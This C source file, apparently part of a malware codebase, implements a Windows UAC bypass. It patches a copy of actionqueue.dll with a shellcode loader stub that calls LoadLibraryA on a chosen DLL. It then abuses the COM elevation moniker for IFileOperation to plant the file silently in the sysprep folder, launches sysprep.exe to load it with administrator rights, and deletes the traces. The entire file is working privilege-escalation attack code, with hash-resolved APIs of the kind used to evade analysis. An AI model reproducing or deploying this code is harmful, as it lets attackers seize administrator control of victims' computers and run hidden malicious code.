#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <imagehlp.h>

#include "Memory.h"
#include "Strings.h"
#include "GetApi.h"
#include "ntdll.h"
#include "utils.h"
#include "com_elevation.h"


#define FAKE_DLL_NAME	L"actionqueue.dll"
#define FOFX_REQUIREELEVATION (0x10000000)
__declspec(naked) VOID dllloader_start()
{
	__asm
	{
		call delta
delta:
		pop	eax
		sub	eax,5
		add eax,0x22222222
		push eax
		mov eax,0x11111111
		call eax
		xor eax,eax
		push eax
		mov eax,0x33333333
		call eax
	}
}

__declspec(naked) VOID dllloader_end(){__asm __emit 'S'}

BOOL WriteFileShellcode(LPCWSTR lpcwFileName,LPSTR lpDllName)
{
	BOOL bRet = FALSE;
	UCHAR ucLoader[1024];
	DWORD dwLoaderSize = (DWORD)dllloader_end-(DWORD)dllloader_start;
	DWORD dwFileSize;
	int DllNameLen = m_lstrlen(lpDllName)+1;
	CHAR chBinary[MAX_PATH];

	m_memcpy(&ucLoader,dllloader_start,dwLoaderSize);
	FixDWORD(ucLoader,dwLoaderSize,0x33333333,(DWORD)GetProcAddressEx(NULL,DLL_KERNEL32,0x95902B19)); /*GetProcAddress(GetModuleHandle("kernel32.dll"),"ExitProcess")*/
	FixDWORD(ucLoader,dwLoaderSize,0x11111111,(DWORD)GetProcAddressEx(NULL,DLL_KERNEL32,0xC8AC8026)); /*GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA")*/
	FixDWORD(ucLoader,dwLoaderSize,0x22222222,dwLoaderSize);

	m_memcpy(ucLoader+dwLoaderSize,lpDllName,DllNameLen);

	 pwvsprintfW(chBinary,"%S",lpcwFileName);

	PVOID pMap = MapBinary(chBinary,FILE_ALL_ACCESS,FILE_FLAG_WRITE_THROUGH,PAGE_READWRITE,FILE_MAP_ALL_ACCESS,&dwFileSize);
	if (pMap)
	{
		PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(pMap);
		if (pNtHdr)
		{
			DWORD HeaderSum, CheckSum;
			
			m_memcpy((PVOID)((DWORD)pMap + RvaToOffset(pNtHdr,pNtHdr->OptionalHeader.AddressOfEntryPoint)),ucLoader,DllNameLen + dwLoaderSize);

			pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
			pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = NULL;
					
			if (pCheckSumMappedFile(pMap,dwFileSize,&HeaderSum,&CheckSum))
			{
				pNtHdr->OptionalHeader.CheckSum = CheckSum;

				bRet = TRUE;
			}
		}

		pFlushViewOfFile(pMap,dwFileSize);
		pUnmapViewOfFile(pMap);
	}

	return bRet;
}

BOOL ComElevation(LPSTR lpDllPath)
{
	BOOL bResult = FALSE;
	typedef HRESULT(WINAPI*funcSHCreateItemFromParsingName)(PCWSTR pszPath,IBindCtx *pbc,REFIID riid,void **ppv);
	funcSHCreateItemFromParsingName pSHCreateItemFromParsingName;
	
	pSHCreateItemFromParsingName = (funcSHCreateItemFromParsingName)GetProcAddressEx(NULL,DLL_SHELL32,0xE44CB1EF)/*GetProcAddress(GetModuleHandle("shell32.dll"),"SHCreateItemFromParsingName")*/;
	if (pSHCreateItemFromParsingName)
	{
		HRESULT Hr;

		Hr = (HRESULT)pCoInitializeEx(NULL,COINIT_APARTMENTTHREADED|COINIT_DISABLE_OLE1DDE);
		if (SUCCEEDED(Hr))
		{
			BIND_OPTS3 bo;
			IFileOperation *pFileOp;
			IShellItem *pSHISource;
			IShellItem *pSHIDestination;
			IShellItem *pSHIDelete;

			m_memset(&bo,0,sizeof(bo));
			bo.cbStruct = sizeof(bo);
			bo.dwClassContext = CLSCTX_LOCAL_SERVER;			

			for (int i = 0; i < 20; i++)
			{
			
				Hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}",&bo,__uuidof(IFileOperation),(PVOID*)&pFileOp);
				if (Hr != 0x800704c7) break;
			}

			if (SUCCEEDED(Hr))
			{
				Hr = (HRESULT)pCoCreateInstance(__uuidof(FileOperation),NULL,CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER,__uuidof(IFileOperation),(PVOID*)&pFileOp);
				if (SUCCEEDED(Hr))
				{
					Hr = pFileOp->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION);
					if (!SUCCEEDED(Hr)) Hr = pFileOp->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS);

					if (SUCCEEDED(Hr))
					{
						WCHAR wcSysDir[MAX_PATH];
						WCHAR wcSysprepDir[MAX_PATH];
						WCHAR wcTempFileName[MAX_PATH];
						WCHAR wcFakedll[MAX_PATH];

						pGetTempPathW((sizeof(wcSysprepDir)/2)-1,wcSysprepDir);
						pGetTempFileNameW(wcSysprepDir,NULL,GetTickCount(),wcTempFileName);

						pGetSystemDirectoryW(wcSysDir,(sizeof(wcSysDir)/2)-1);
						pPathCombineW(wcFakedll,wcSysDir,FAKE_DLL_NAME);

						if (pCopyFileW(wcFakedll,wcTempFileName,FALSE) && WriteFileShellcode(wcTempFileName,lpDllPath))
						{
							DbgPrint(__FUNCTION__"(): fake dll: '%S' inject dll '%s'\n",wcTempFileName,lpDllPath);	
							
							Hr = pSHCreateItemFromParsingName(wcTempFileName,NULL,__uuidof(IShellItem2),(PVOID*)&pSHISource);
							if (SUCCEEDED(Hr))
							{
								pPathCombineW(wcSysprepDir,wcSysDir,L"sysprep");
								Hr = pSHCreateItemFromParsingName(wcSysprepDir,NULL,__uuidof(IShellItem2),(PVOID*)&pSHIDestination);
								if (SUCCEEDED(Hr))
								{
									Hr = pFileOp->CopyItem(pSHISource,pSHIDestination,FAKE_DLL_NAME,NULL);
									if (SUCCEEDED(Hr))
									{
										Hr = pFileOp->PerformOperations();
										if (SUCCEEDED(Hr))
										{
											BOOL bAborted = TRUE;
											while (bAborted)
											{
												Hr = pFileOp->GetAnyOperationsAborted(&bAborted);
												if (!SUCCEEDED(Hr))
												{
													DbgPrint(__FUNCTION__"(): GetAnyOperationsAborted failed: %x\n",Hr);	
													break;
												}
											}

											SHELLEXECUTEINFOW shinfo = {0};
									
											pPathCombineW(wcTempFileName,wcSysDir,L"sysprep\\sysprep.exe");
											shinfo.cbSize = sizeof(shinfo);
											shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
											shinfo.lpFile = wcTempFileName;
											shinfo.lpParameters = NULL;
											shinfo.lpDirectory = wcSysprepDir;
											shinfo.nShow = SW_SHOW;
										
											for (;;)
											{
												if (pShellExecuteExW(&shinfo) == 0)
												{
													if ( (DWORD)pGetLastError() != ERROR_CANCELLED) break;

													DbgPrint(__FUNCTION__"(): ShellExecuteExW failed: %x\n",(DWORD)pGetLastError());													
												}
												else
												{
													break;
												}
											}

											if ( WAIT_TIMEOUT == (DWORD)pWaitForSingleObject(shinfo.hProcess,120*1000) )
											{
												pTerminateProcess(shinfo.hProcess,0);
											}
											pCloseHandle(shinfo.hProcess);

											bResult = TRUE;

											pPathCombineW(wcFakedll,wcSysprepDir,FAKE_DLL_NAME);
											Hr = pSHCreateItemFromParsingName(wcFakedll,NULL,__uuidof(IShellItem2),(PVOID*)&pSHIDelete);
											if (SUCCEEDED(Hr))
											{
												Hr = pFileOp->DeleteItem(pSHIDelete,NULL);
												if (SUCCEEDED(Hr))
												{
													pFileOp->PerformOperations();
												}
												else
												{
													DbgPrint(__FUNCTION__"(): DeleteItem failed: %x\n",Hr);		
												}

												pSHIDelete->Release();
											}
											else
											{
												DbgPrint(__FUNCTION__"(): SHCreateItemFromParsingName failed: %x\n",Hr);		
											}
										}
										else
										{
											DbgPrint(__FUNCTION__"(): PerformOperations failed: %x\n",Hr);		
										}
									}
									else
									{
										DbgPrint(__FUNCTION__"(): CopyItem failed: %x\n",Hr);	
									}

									pSHIDestination->Release();
								}
								else
								{
									DbgPrint(__FUNCTION__"(): SHCreateItemFromParsingName failed: %x\n",Hr);		
								}

								pSHISource->Release();
							}
							else
							{
								DbgPrint(__FUNCTION__"(): SHCreateItemFromParsingName failed: %x\n",Hr);	
							}

							DeleteFileW(wcTempFileName);
						}
					}
					else
					{
						DbgPrint(__FUNCTION__"(): SetOperationFlags failed: %x\n",Hr);
					}

					pFileOp->Release();
				}
				else
				{
					DbgPrint(__FUNCTION__"(): CoCreateInstance failed: %x\n",Hr);
				}
			}
			else
			{
				DbgPrint(__FUNCTION__"(): CoGetObject failed: %x\n",Hr);
			}

			pCoUninitialize();
		}
		else
		{
			DbgPrint(__FUNCTION__"(): CoInitializeEx failed: %x\n",Hr);
		}
	}
	else
	{
		DbgPrint(__FUNCTION__"(): GetProcAddress failed: %x\n",pGetLastError());
	}

	DbgPrint(__FUNCTION__"(): %s\n", bResult ? "OK" : "failed");

	return bResult;
}